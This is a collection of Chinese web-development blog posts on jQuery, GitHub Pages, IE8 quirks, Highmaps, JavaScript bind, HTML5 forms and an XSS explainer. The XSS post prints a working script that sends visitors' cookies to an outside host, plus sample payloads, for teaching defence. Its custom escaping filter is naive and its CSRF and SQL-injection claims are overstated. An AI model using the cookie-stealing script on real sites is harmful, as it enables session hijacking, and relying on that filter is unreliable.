在jQuery中，其余的遍历方法都是处理查找同级的包装集。一些基础的方法是就遍历的方向而言的。你可以用.prev()查找前一个元素，.next()查找后一个元素，及用.siblings()查找全部的两个元素。也有建立在这几个基础方法上的其他方法： .nextAll()， .nextUntil()， .prevAll() 和 .prevUntil()。
    // 在选择器中选择下一个同级元素：

    // returns [ div.surrogateParent1 ]
    $( "div.parent" ).next();

    // 在选择器中选择前一个同级元素：

    // 在div.parent之前没有同级元素的存在的情况下返回[]
    $( "div.parent" ).prev();

    // 在选择器中选择所有下一个同级元素：

    // returns [ div.surrogateParent1, div.surrogateParent2 ]
    $( "div.parent" ).nextAll();

    // returns [ div.surrogateParent1 ]
    $( "div.parent" ).nextAll().first();

    // returns [ div.surrogateParent2 ]
    $( "div.parent" ).nextAll().last();

    // 在选择器中选择所有上一个同级元素：     

    // returns [ div.surrogateParent1, div.parent ]
    $( "div.surrogateParent2" ).prevAll();

    // returns [ div.surrogateParent1 ]
    $( "div.surrogateParent2" ).prevAll().first();

    // returns [ div.parent ]
    $( "div.surrogateParent2" ).prevAll().last();
用 .siblings()选择所有同级元素：
    // 在两个方向上选择一个元素的匹配给出选择器的同级元素

    // returns [ div.surrogateParent1, div.surrogateParent2 ]
    $( "div.parent" ).siblings();

    // returns [ div.parent, div.surrogateParent2 ]
    $( "div.surrogateParent1" ).siblings();
到Traversal documentation on api.jquery.com去查看这些和更多方法的全部文档。
在文档中遍历很长距离的时候要当心——复杂的遍历必须使文档结构保持不变，这很难保证即使你是创建整个从服务器到客户端应用程序的人。一步或者两步的遍历会很不错，但最好还是避免从一个容器到另一个容器的遍历。
原文地址

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        
整shi人的end();
今天晚上给小伙伴们一起交流学习jQueryDom操作的时候，遇到end()方法，然后在一起纠结了很长一段时间，jQuery文档上说的很笼统，一定要细细的品位才能知道个大概
End the most recent filtering operation in the current chain and return the set of matched elements to its previous state.
结束当前链中最近的过滤操(有的成为破坏性)作并返回匹配的元素集合到其之前的状态。
然后jQuery1.7的文档给出了这样一个例子
<div></div><div></div>
 $("<p/>")
   .appendTo("div")
   .addClass("test")
   .end()
   .addClass("test2");
运行后的结果就是
<div><p class="test test2"></p></div>
<div><p class="test"></p></div>
一直没有搞不清为什么第一个div里会添加两个class，而第二个只有一个。。。就这个问题几个小伙伴在一起讨论来讨论去（都没用过end）； 
各种找资料，不一会，全部都蒙圈了，后来使用火狐调试，一步一步的运行，有了眉目
1.$('<p/>').appendTo('div')返回的是：[p,p]对象数组，即新增后的两个p标签；
2.$('<p/>').appendTo('div').addClass('c1')返回的是：[p.c1,p.c1]对象数组，即添加了c1类样式后的p对象数组；
3.$('<p/>').appendTo('div').addClass('c1').end()返回的是[p.c1],是第1个<div>中的<p>,在2操作中，最后“破坏”的是第2个<div>中的 <p>,所以他的前一次操作的对象是第1个<div>中的<p>,返回的就是它;
4.$('<p/>').appendTo('div').addClass('c1').end().addClass('c2')返回的仍然是第1个<div>中的<p>; 
end()方法能够回到最近的一个”破坏性”操作之前，即将匹配的元素列表变为前一次的状态。 
如果没有破坏性操作将返回一个空集。 
破坏性操作的概念:指任何改变所匹配元素的操作。可能大家对这个概念比较模糊，举个例子:
$("li").css("color","red");
以上代码的CSS函数就不是一个破坏性操作，因为匹配元素列表并没有发生变化，改变的是元素中的文本内容的CSS属性。
$("li").find(".first")
以上代码就是一个破坏性操作，因为匹配元素的列表发生了变化，比如有三个li元素，那么匹配元素的列表有三个元素，但是经过使用find()方法筛选以后，匹配元素列表只有一个元素了，这就是发生了”破坏性”操作。 
再看一个例子
<%@ page language="java" contentType="text/html; charset=utf-8"
    pageEncoding="utf-8"%>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>脚本之家</title>
<script type="text/javascript" src="../js/jquery-1.7.2.min.js"> </script>
<script type="text/javascript"> 
$(document).ready(function(){ 
 $(".first").find(".div").css("color","green"); 
 $(".second").find(".div").end().css("color","blue"); 
 //$(".third").find(".js")
 //$(".third").css("color","red") 
 $(".third").find(".js").css("color","blue").end().css("color","red") 
}) 
</script>
</head>
<body>
<div>
 <ul class="first">
  <li>HTML专区</li>
  <li>Javascript专区</li>
  <li class="div">Div+Css专区</li>
  <li>Jquery专区</li>
 </ul>
 <ul class="second">
  <li>HTML专区</li>
  <li>Javascript专区</li>
  <li class="div">Div+Css专区</li>
  <li>Jquery专区</li>
 </ul>
 <ul class="third">
  <li>HTML专区</li>
  <li class="js">Javascript专区</li>
  <li>Div+Css专区</li>
  <li>Jquery专区</li>
 </ul>
</div>
</body>
</html>
被注释的部分就相当于最右一句，这个end需要慢慢的体会！ 
今晚，抱着“破坏性”入睡吧。。。

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

github创建blog并绑定域名之终结篇
创建博客
在github创建博客用的是github page
github-page是一个免费的静态网站托管平台，由github提供，它具有以下特点：

免空间费，免流量费能装逼，全世界通装具有项目主页和个人主页两种选择支持页面生成，可以使用jekyll来布局页面，使用markdown来书写正文可以自定义域名
它其实就是在github新建一个特殊的仓库，特殊在哪里呢，这个仓库名必须是固定格式的，比如你github名是shabi，那么你这个仓库名必须是shabi.github.io。
如果你不会新建的话，要么百度，google，要么放弃吧
绑定域名
ping下你的博客地址,得到一个ip以便用作我们要绑定的域名的A记录，比如ping  shabi.github.io  


得到103.245.222.133这个域名。


在域名提供商哪里做两步：


添加A记录到103.245.222.133添加cname记录到shabi.github.io



效果应该如下：  
          你的域名          ->103.245.222.133
          www.你的域名-> 你的github名.github.io
这个时候生效的话你ping你的域名就应该能粗出来了
访问试试，开始尽情的装逼吧



版权声明：本文为博主原创文章，未经博主允许不得转载。

jQuery入门：CSS，样式和大小
jQuery包含了获取和设置元素的CSS属性的简便方法：    
    //获取CSS属性

    $( "h1" ).css( "fontSize" ); // Returns a string such as "19px".返回一个字符串"19px"。
    $( "h1" ).css( "font-size" ); // Also works.同样会工作。

    // 设置CSS属性。

    $( "h1" ).css( "fontSize", "100px" ); // Setting an individual property.设置单独的属性

    // 设置多个属性。

    $( "h1" ).css({

        fontSize: "100px",

        color: "red"

    });
注意第二行参数的形式——它是一个包含多重属性的对象。这是传递多重参数到一个函数的常用办法，且很多jQuery设置函数的方法都接受一次性设置多个值的对象。
CSS属性在JavaScript中通常需要将连字号换成驼峰式拼写。例如，CSS属性font-size被用做Javascript中的一个属性名称的时候，用fontSize来表示。然而，当用.css()方法象字符串一样传递一个CSS属性名称的时候，并不会这样应用——在这种情况下，不管是驼峰式拼写还是连字号的形式都将运行。
当用一个对象来设置CSS的时候，CSS属性应该用驼峰式拼写而不应该用一个连字号，但在可生产代码（production-ready code）中，不推荐使用.css()做为设置函数。
应用CSS classes 设置样式
做为一个获取函数，.css()方法是很有价值的。然而，在生成就绪的代码中通常会避免将它做为设置函数，因为通常表现的信息最好和JavaScript代码保持分离。相反，用classes写那些描述多种显示形式的CSS规则，然后更换元素的class。
    // 用classes工作。

    var h1 = $( "h1" );

    h1.addClass( "big" );

    h1.removeClass( "big" );

    h1.toggleClass( "big" );

    if ( h1.hasClass( "big" ) ) {

        ...

    }
Classes还能够被用来存储关于一个元素的状态信息，例如表明哪个元素被选择。
大小
jQeury提供了丰富的方法用来获取和修饰一个元素的尺寸和定位信息。
下面的代码展示了jQuery中获取元素尺寸大小功能的一个简短概述。如果需要jQuery操作元素尺寸大小方法的全部细节，参见dimensions documentation on api.jquery.com。
    // 基础的尺寸大小方法。

    //设置所有<h1>元素的宽度。
    $( "h1" ).width( "50px" );

    //获取第一个<h1>元素的宽度。
    $( "h1" ).width();

    //设置所有<h1>元素的高度。
    $( "h1" ).height( "50px" );     

    //获取第一个<h1>元素的宽度。
    $( "h1" ).height();

    // 返回一个对象，包含第一个<h1>相于对于它的“父元素偏移（定位）”的定位信息。
    $( "h1" ).position();
原文地址

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        
IE兼容性开发的笔记

当前项目组开发的产品对外承诺支持IE9和IE11，但在推广应用过程中发现存在相当比例的用户实际上还在使用IE8，而这相当比例中的用户还包括了大部分的公司领导。为了满足公司内部各阶层人士体验我们产品的诉求，开发团队的上层领导经过协商，决定投入专门的精力来完成IE8的支持。本文是笔记，记录了整改过程中发现、解决的一些问题。

IE兼容模式

简单的说，即是在jsp页面的头部增加如下的代码，指定浏览器以最高模式来呈现页面。对于我们项目组的产品来说，如下的代码可以保证IE8、IE9、IE11的用户在打开页面时，都可以得到最佳的体验。
<meta http-equiv="X-UA-Compatible" content="IE=edge">
至于这行代码的具体含义，可以问度娘，相信会有满意的答复。
如果没有这行代码，当前项目开发的jsp页面在IE8模式下打开时，会报一些稀奇古怪的、和jquery、JSON相关的错误，加上这行代码之后，这些错误就消失了。

字符串的trim方法

项目组内开发人员在页面上大量应用到了字符串的trim方法，IE9及其以上版本的IE浏览器都默认提供了trim方法，但IE8并没有提供，因此页面上使用trim方法的地方都会报js错。解决方法比较简单，直接使用jquery提供的trim方法，比如"axdfa ".trim()替换为$.trim("axdfa ")，问题即可解决。

变量定义

页面上有一个div，id为xxxx，代码样例如下。

<div id="xxxxx"></div>
此时js代码中如出现如下的代码，并且xxxxx没有使用var来声明，那么js在执行到如下一行时会报错，提示信息是对象不支持此属性或方法。
xxxxx = 1;
这个问题初始发现时让我纠结了相当长时间，分析思路一度跑偏，以为是IE8的js引擎对于语法要求比较高，而IE9和IE11的语法要求比较低；但奇怪的是，网上并没有搜索到相关的话题，所以并不确定。后来经高手启发，并反复尝试之后，才发现当页面上存在前述场景时，IE8模式下js代码是一定会报错的。
明确了问题之后，修改方法就非常明确了，要么修改div的id，要么使用变量前用var来显式初始化。


数组的遍历

对于数组var a = [1,2,4,]，在IE8下，使用下标方式和jquery的each方法遍历数组时，会多遍历得到一个null对象；而使用IE9、IE11则不会存在这个问题。因此数组的最后一个元素之后切记不可增加“,”，否则会导致页面的js在IE8时出现诡异的表现。

数组的indexOf方法

IE8不支持数组的indexOf方法，为了满足在数组中查找对象的需要，代码中通常会为数组扩展indexOf方法。这引入一个问题，在使用foreach方式遍历数组时，indexOf方法也会作为数组的一个成员被遍历到，这比较讨厌；而使用下标方式和jquery的each方法来遍历数组，则不会引入这个问题。
if (!Array.prototype.indexOf) {
Array.prototype.indexOf = function () {
// ...
}
}

因此我个人建议是不要为数组提供indexOf方法的实现，直接使用jquery的inArray方法，也可以达到相同的效果，但需要注意的是inArray方法在使用时，被查询对象在前，数组对象在后。




欢迎访问Jackie的家，http://jackieathome.sinaapp.com/，如需转载文章，请注明出处。


版权声明：本文为博主原创文章，未经博主允许不得转载。

使用jQuery的ajax同步请求吃过的亏
jQuery是一个很常用的js库。甚至我们开发任何一个项目都首先把jquery导入进行。jQuery太过强大，使用起来非常方便。但是在使用的过程中也遇到过很多坑。我在这里分享一下，避免大家也遇到同样的问题束手无策，也方便以后回归学习。普通的写法:$.ajax({
	url:url,
	type:'POST',
	async:false,
	data:{
		id:1
	},
	dataType:'json',
	timeout:666666,
	success:function(resultObj){
	}
});这里有两个要点：1.有些版本的async这个属性，不能加引号(如：'false'或"false"就不起作用)2.dataType这个属性必须和返回的响应内容对应。即返回xml的话，就不能使用dataType:'json',这样会导致success回调函数不执行。3.timeout设置请求超时时间（毫秒）。此设置将覆盖全局设置。设置过大，数字过长，部分浏览器就不支持了。具体使用查看http://jquery.cuishifeng.cn/jQuery.Ajax.html在线api欢迎大家关注我的博客！如有疑问,请加QQ群：454796847共同学习！

版权声明：本文为博主原创文章，未经博主允许不得转载。

​Highmaps网页图表教程之绘图区显示标签显示数据标签定位

​Highmaps网页图表教程之绘图区显示标签显示数据标签定位

Highmaps数据标签定位

由于数据标签是和节点一一对应，所以数据标签是依据节点位置进行定位的。本节详细讲解如何对数据标签进行定位。

Highmaps节点定位

在mappoint、mapbubble、mapline图表类型，节点都有明确位置。而在map图表类型中，节点对应的是一个区域。所以，map图表类型的节点中心位置就可以由用户来设定。设置时候需要使用到以下两个配置项：

middleX: Number1

middleY: Number2

其中，参数Number1指定节点中心在水平方向的位置，值的范围为0~1。0表示节点对应区域的最左端，1表示最右端；默认值为0.5。参数Number2指定节点中心在垂直方向的位置，值的范围为0~1。0表示区域的最顶端，1表示最底端；默认值为0.5。

Highmaps对齐定位

在节点确定后，用户就可以设置数据标签相对节点的水平和垂直对齐方式了。下面依次讲解这两种方式：

（1）使用配置项align设置水平对齐方式。其语法如下：


align: String


其中，参数String指定水平的对齐方式，允许的值包括left、center、right，默认值为center。例如，如果用户设置为left，就表示数据标签的左端和节点对齐。

（2）使用配置项verticalAlign设置垂直对齐方式。其语法如下：


verticalAlign:String


其中，参数String指定垂直的对齐方式，允许的值包括top、middle、bottom，默认值为middle。如果用户设置为top，就表示数据标签的顶端和节点对齐。

Highmaps节点偏移

数据标签相对节点定位后，用户还可以对其位置进行一定的偏移。这时需要使用到以下两个配置项。

（1）使用配置项x设置水平偏移距离，其语法如下：


x: Number


其中，参数Number指定水平偏移位置，单位为px，默认值为0。

（2）使用配置项y设置垂直偏移距离，其语法如下：


y: Number


其中，参数Number指定垂直偏移位置，单位为px，默认值为1。

【实例4-6：dataLabelsposition】下面对节点位置进行设置。核心代码如下：


                series: [{

                    dataLabels: {

                        enabled: true,

                        color:'red',

                        middleX: 0.5,                                        //设置节点中心的水平位置

                        middleY: 0.5,                                        //设置节点中心的垂直位置

                        align: 'left',                                             //设置水平对齐方式

                        verticalAlign: 'top',                                //设置垂直对齐方式

                        x: 0,                                                         //设置水平偏移距离

                        y:0                                                           //设置垂直偏移距离

                    },

                }],


执行代码后，效果如图4.6所示。




图4.6  重新设置数据标签的位置

Highmaps标签框架

标签文本外围就是标签框架。Highmaps允许用户定义框架的颜色，填充色和边框。下面依次讲解几项。

1.边框

边框是标签框架的轮廓。默认状态下，边框线宽为为0，所以看不到边框。用户可以设置边框的以下三个方面：


q  边框颜色：borderColor:
 Color

q  边框圆角：borderRadius:
 Number1

q  边框线宽：borderWidth:
 Number2


其中，参数Color指定边框的颜色；参数Number1指定边框的圆角半径，单位为px，默认值为0；参数Number2指定边框的线宽，单位为px，默认值为0

2.形状

默认状态下，边框的形状为矩形square。用户可以根据需要，使用配置项shape重新指定。其语法如下：


shape: String


其中，参数String指定边框形状，允许的值包括circle（圆形）、diamond（菱形）、square（矩形）、triangle（三角形）、triangle-down（倒三角形）。默认值为square。

3.背景色

为了凸显数据，用户使用配置项backgroundColor还可以设置边框的填充颜色。其语法如下：


backgroundColor: Color


其中，参数Color指定填充色颜色。

【实例4-7：dataLabelsborder】下面指定数据标签框架样式。核心代码如下：


                series: [{

                    dataLabels: {

                        borderWidth: 2,                                           
 //设置边框线宽

                        borderColor: 'black',                                           
 //设置边框颜色

                        shape: 'circle',                                                      
 //设置边框形状

                        backgroundColor:'black'                                   
 //设置填充颜色

                    },

                }],


执行代码后，效果如图4.7所示。




图4.7  设置数据标签边框

Highmaps标签显示模式

标签阴影

当用户为标签添设置边框线宽度或者填充颜色后，还可以为标签设置阴影效果。设置标签阴影需要借助shadow配置项。其语法如下：


shadow: Boolean|Object


该配置型的值可以为布尔类型，也可以是对象类型。当值为false时，表示禁用阴影效果；当值为true时，启用阴影效果。当值为对象时，用户可以设置阴影的具体效果。其结构如下：


{

    color:Color,

    offsetX:Number1,

    offsetY:Number2,

    opacity:Number3,

    width:Number4

}


其中，参数Color指定阴影的颜色；参数Number1和Number2指定阴影的水平和垂直偏移距离，单位为px；参数Number3指定阴影的透明度，值为0~1之间；参数Number4指定阴影的宽度，单位为px。

Highmaps超出绘图区显示

当节点元素接近绘图区边缘时，节点对应的数据标签往往会超出绘图区范围。默认状态下，Highmaps会自动调整数据标签的位置。如果调整后，仍然超出绘图区，则不显示该数据标签。为了避免这种情况，用户可以手动设置显示模式，避免数据标签位置的调整和舍弃。这时需要使用以下两个配置项。

（1）使用配置项overflow设置标签的浮动模式。其语法如下：


overflow: String


其中，参数String指定浮动模式类型，允许的值为justify和none。当值为justify时，Highmaps会根据情况自动调整数据标签位置；当值为none时，则禁用Highmaps的自动调整。

（2）使用配置项crop设置是否舍弃超出范围的数据标签。其语法如下：


crop: Boolean


该配置型的值为布尔类型。当值为true时，会舍弃超出绘图区的数据标签；当值为false，则显示全部的数据标签。

Highmaps绘图区内显示

在绘图区内显示时，数据标签不仅涉及和其他元素的层叠问题，还涉及多个数据标签之间互相层叠问题。下面依次讲解这两个问题。

1.和其他元素的层叠

如果数据标签被其他图表元素覆盖，这时可以通过设置数据标签的配置项zIndex来调整。其语法如下：


zIndex: Number


其中，参数Number指定层叠顺序值，默认值为6。值越大，显示越靠上。

2.标签之间的层叠

当地图区域很多时，各个区域的数据标签很容易发生层叠问题。由于同属一类元素，所以通过zIndex无法进行设置。这时候，用户可以使用数据节点配置项data提供的子配置项labelrank来设置。其语法如下：


labelrank: Number


其中，参数Number指定该节点对应的数据标签显示优先级。数值越大，优先级越高，越显示在上层。不同优先级的数据标签发生层叠后，低优先级的数据标签会被隐藏。

如果用户只希望覆盖，而不希望发生隐藏，可以设置配置项allowOverlap。其语法如下：


allowOverlap: Boolean


该配置项的值为布尔类型。当值为true时，允许数据标签重叠，而不隐藏；当值为false时，则不允许重叠。

本文选自：Highmaps网页图表基础教程大学霸内部资料，转载请注明出处，尊重技术尊重IT人！



版权声明：本文为博主原创文章，未经博主允许不得转载。

用bind方法保持this上下文
最近自学JavaScript，学到bind方法这块儿有些地方不太明白，自己就查了些资料，结合自己的理解写了这篇文章以备后面回顾用。。。其实应该还是搬砖为主吧。
什么是this对象
先来说说什么是this对象吧，每个函数在调用的时候都会自动获取两个特殊变量：this和arguments对象。this值具体是指哪个对象是和该函数的执行环境相关的。如果是作为对象的方法，那么this就是对象实例本身；如果是一个全局函数，那么this就是window对象。用一句话来概括，this就是调用这个方法的对象。
保持this上下文
有时候，我们需要保持this的上下文，也就是在一个执行环境中想要访问到另一个执行环境的this值。在什么时候需要这么做呢？比如说将一个对象的方法赋值给了一个全局变量，然后在全局变量中调用这个方法，那么this值就不再是原来的对象而是window对象了，然而可能我们仍需要在全局环境中按照对象的方法来调用。又比如说一个方法中包含了闭包，闭包是无法访问到其外部函数的this对象的，因为this对象是在调用方法的时候自动生成，内部函数在搜索这两个变量的时候只会搜索到其自身的活动对象，而不会沿着作用域链往外搜索，所以闭包访问不到外部函数的this值。如果要想访问，就应该想办法把this值传递下去。 
通常可以通过这样的方式保持this上下文：在外部函数中将this缓存到一个变量中，通常变量名称使用self, _this 或者 context，那么闭包就可以通过这个可访问的变量来获取外部函数的this值，this上下文得以保持。比如下面的代码：
var myObj = {

    specialFunction: function () {},
    getAsyncData: function (cb) {
        cb();
    },

    render: function () {
        var that = this;
        this.getAsyncData(function () {
            that.specialFunction();
        });
    }
};
myObj.render();
这里有一个对象myObj，它有一个render实例方法，在这个方法内部又调用了它的另一个实例方法getAsyncData，而这个方法有一个新的函数作为参数，这个函数相当于是一个闭包，是不能获取到外部函数中的this值的，为了在这个闭包中也能访问实例方法，需要获取到外部环境的this值，这里把this（this为调用render方法的对象，即实例对象myObj）缓存到了变量that中。
此外还可通过bind方法，这就是本文所要讲述的重点。
bind方法
bind方法生成了一个新的函数，称为绑定函数，传入bind方法的第一个参数作为这个绑定函数的this对象，传入bind的第二个参数连同后面调用绑定函数时传入的参数按照先后顺序（传入bind的在前）构成绑定函数的参数。 
现在我们把上面的例子修改一下：
render: function () {
    this.getAsyncData(function () {

        this.specialFunction();

    }.bind(this));

}
.bind()创建了一个函数，当这个函数在被调用的时候，它的 this 关键词会被设置成被传入的值（这里指调用bind()时传入的参数） 
再看一个bind的使用例子：
var foo = {
    x: 3
} 
var bar = function(){
    console.log(this.x);
} 
bar(); 
// undefined

var boundFunc = bar.bind(foo);

boundFunc(); 
// 3
将bar方法和foo对象绑定后，bar中的this对象被替换为了foo，并生成了一个新的函数boundFunc，因此在全局环境中调用boundFunc时，也可以访问到foo对象的属性。 
还可以了解一下Function.prototype.bind()内部是什么样的：
Function.prototype.bind = function (scope) {
    var fn = this;//this是调用bind方法的对象（别的方法对象）
    return function () {
        return fn.apply(scope);//把fn环境中的this替换为scope
    };
}
可看出，bind方法返回了一个新的函数，这个方法返回了原方法（调用bind的方法）通过apply修改作用域（传入的参数scope）后的执行结果。如果调用这个新函数则会立即执行fn.apply(scope)，并返回执行后的结果。
fn.bind()
与call、apply的区别
call、apply是修改函数的作用域，并且立即执行，而bind是返回了一个新的函数，不是立即执行，即call and apply call a function while bind creates a function。bind在回调函数中常用到。
参考资料： 
理解 JavaScript 中的 Function.prototype.bind 
js中bind、call、apply函数的用法 
https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

Web安全之XSS跨站脚本攻击
本文主要选择常见web攻击手段之一的XSS（跨站点脚本攻击）来进行讲解，说明其攻击原理，并提出相应的解决办法。

XSS
XSS 攻击，全称是“跨站点脚本攻击”（Cross Site Scripting），之所以缩写为 XSS，主要是为了和“层叠样式表”（Cascading Style Sheets，CSS）区别开，以免混淆。 
XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其他用户使用的页面中。XSS是针对Web站点的客户隐私的攻击，当客户详细信息失窃或受控时可能引发彻底的安全威胁。大部分网站攻击只涉及两个群体：黑客和 Web 站点，或者黑客和客户端受害者。与那些攻击不同的是，XSS 攻击同时涉及三个群体：黑客、客户端和 Web 站点。XSS 攻击的目的是盗走客户端 cookies，或者任何可以用于在 Web 站点确定客户身份的其他敏感信息。手边有了合法用户的标记，黑客可以继续扮演用户与站点交互，从而冒充用户。 
举例来说，可以利用 XSS 攻击窥视用户的信用卡号码和私有信息。通过利用 Web 站点的访问特权，在受害者（客户端）浏览器上运行恶意的JavaScript代码来实现。这些是非常有限的JavaScript特权，除了与站点相关的信息，一般不允许脚本访问其他任何内容。重点强调的是，虽然 Web 站点上存在安全漏洞，但是 Web 站点从未受到直接伤害。但是这已经足够让脚本收集 cookies，并且将它们发送给黑客。 
跨站脚本攻击有两种攻击形式： 
1. 反射型跨站脚本攻击 
    攻击者会通过社会工程学手段，发送一个URL连接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。 
2. 存储型跨站脚本攻击 
    攻击者利用web应用程序提供的录入或修改数据功能，将数据存储到服务器或用户cookie中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本。所有浏览者都会受到攻击。 
3. DOM跨站攻击 
    由于html页面中，定义了一段JS，根据用户的输入，显示一段html代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。 
    DOM跨站和以上两个跨站攻击的差别是，DOM跨站是纯页面脚本的输出，只有规范使用javascript，才可以防御。

原理
读到这里，相信大家对XSS的概率已经有了一定的理解，下面我们通过举例来说说攻击的原理。 
如果下面是我们网站的一段PHP代码：
<tr>
<td><?=$row["id"] ?></td>
<td><?=$row["pname"]?></td>
<td><?=$row["pdesc"]?></td>
<td><?=$row["ptype"]?></td>
</tr>
那么攻击者可以在添加产品时插入恶意脚本： 

攻击者发布产品后，等待用户浏览产品列表页面，用户浏览页面如下： 
 
就会执行攻击者写的inbreak.net/a.js恶意脚本。脚本内容如下：
a=document.createElement("iframe");
function b(){e=escape(document.cookie);
c=["http://www.inbreak.net/kxlzxtest/testxss/a.php?cookie=",e,Math.random()];
document.body.appendChild(a);a.src=c.join();}
setTimeout('b()',5000);
其功能是获取当前浏览者的cookie，并发送到a.php，用户的cookie已经就会到攻击者的服务器上。攻击者利用浏览器插件，将自己的cookie替换成刚刚获取的用户的cookie，就可以狸猫换太子的冒充用户了。

防御
原理说清楚了，再来谈谈如何防御吧。 
最基本的防御就是对用户的输入进行转义，例如 
<script type='text/javascript'>alert('hello world')</script> 
如果直接保存这个字符串的话，然后再输出的话，就会运行JS了。 
我们需要将这个字符串转义成
"&lt;script type='text/javascript'&gt;alert('hello world')&lt;/script&gt;"
有些语言自带的就有一些函数来实现转义的功能。 
比如php中，提供了 htmlspecialchars() 函数可以将HTML 特殊字符转化成在网页上显示的字符实体编码。这样即使用户输入了各种HTML 标记，在读回到浏览器时，会直接显示这些HTML 标记，而不是解释执行。 
这里举一个例子：
<b> 欢迎：<?= $welcome_msg?></b>
攻击者输入：
<script>evil_script()</script>
结果为：
<b>欢迎：<script>evil_script()</script></b>
分析可以得知，在HTML 正文背景下，< > 字符会引入HTML 标记，& 可能会认为字符实体编码的开始，所以需要将< > & 转义。为简洁起见，直接使用 htmlspecialchars() 将5 种HTML 特殊字符转义，如：
<b>欢迎：<?= htmlspecialchars($welcome_msg, ENT_NOQUOTES)?></b>
其中ENT_NOQUOTES的意思是不对单引号和双引号进行编码。 
而其他语言，比如.net，则有微软提供的类库AntiXSS，它的实现原理是白名单机制。使用起来也很简单，就是通过AntiXss.GetSafeHtmlFragment(html)方法，来替换掉html里的危险字符。代码如下：
    var html = "<a href=\"#\" onclick=\"alert();\">aaaaaaaaa</a>javascript<P><IMG SRC=javascript:alert('XSS')><javascript>alert('a')</javascript><IMG src=\"abc.jpg\"><IMG><P>Test</P>";

string safeHtml = AntiXss.GetSafeHtmlFragment(html);
Console.WriteLine(safeHtml);

上面的危险内容会被成功替换为：
<a href="">aaaaaaaaa</a>javascript
<p><img src="">alert('a')<img src="abc.jpg"><img></p>
<p>Test</p>

同样的，在java中，也可以通过引入第三方的jar包，来避免XSS攻击，比如commons-lang-2.5.jar。 
    即使不使用自带的方法或者第三方库，我们还可以通过自己编写方法来实现转义。
    private String cleanXSS(String value) {
        value = value.replaceAll("<", "& lt;").replaceAll(">", "& gt;");
        value = value.replaceAll("\\(", "& #40;").replaceAll("\\)", "& #41;");
        value = value.replaceAll("'", "& #39;");
        value = value.replaceAll("eval\\((.*)\\)", "");
        value = value.replaceAll("[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']", "\"\"");
        value = value.replaceAll("script", "");
        return value;
    }

这种自定义函数过滤器的方法，不仅仅防御XSS攻击，还可以防御CSRF攻击和SQL注入等安全问题。

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

jquery制作banner图片左右上下切换滚动特效


原文：jquery制作banner图片左右上下切换滚动特效

源代码下载地址：http://www.zuidaima.com/share/1607124681411584.htm










版权声明：本文为博主原创文章，未经博主允许不得转载。

HTML5基础知识汇总_(2)自定义属性及表单新特性
自定义属性data-*
说起这个属性,其实现在很常见了;怎么说呢,因为在一些框架都能看到他的身影!!! 
比如Jquery mobile,里面非常频繁的使用了这个属性;
这个属性是哪里来的….当然是跟随最新的H5一起出来的….. 
兼容性在PC端只能呢说一般般(目前.比较老式浏览器居多),,手机端支持还是比较OK的;
虽说是自定义属性,但是还是有一定的规格的,,比如前缀必须是data-[自定义属性];
比如
    <div data-id="id"></div>
这货有什么用呢?用来操作数据的居多,比如给一款游戏弄一些额外的信息!!(data-level,data-score); 
而操作数据一般有两种方式(原生JS和JQ): 
1. 利用 getAttribute、setAttribute 存取 data[原生JS操作] 
2. 利用 dataset API 存取 dataset [这种可以直接忽略data-,类似对象直接访问属性,也是JS操作的] 
3. jQuery使用attr 和 data 依次等同于上面两种
在网上发现了一篇讲解比较详细的操作数据,可以瞄瞄 
传送门: http://blog.netsh.org/posts/html-data-jquery_1812.netsh.html

表单的进化!
input增加的特性!
email
邮箱: <input type="email" name="user_email" >

若是用submit提交会验证Email,检查是否缺少@,@后面是否为空….挺齐全的

url
首页: <input type="url" name="user_url" >

同上,会检查内容格式,目前只支持绝对路径!!!!

number
页数: <input type="number" name="pagin" min="1" max="30" />

有四个属性: 
min : 最小值 , 小于会报错提醒
max : 最大值, 大于会报错提醒
step : 默认为1, 可以看需求设置
value : 设置默认值,这个跟传统的一样 

range
范围:<input type="range" name="range" min="5" max="25" />

这个和上面那个非常相似,连属性值都一致了..就是表现形式不同,,显示为滚动条
值得一提的是,宽高度的不一致决定了滚动条的方向是水平还是垂直;h>w.垂直!!

Date pickers
 <input type="[attribute]" name="user_week" />
[attribute]换成下面的属性就能看到各种效果了,,就是兼容性不怎么样,chrome下正常; 
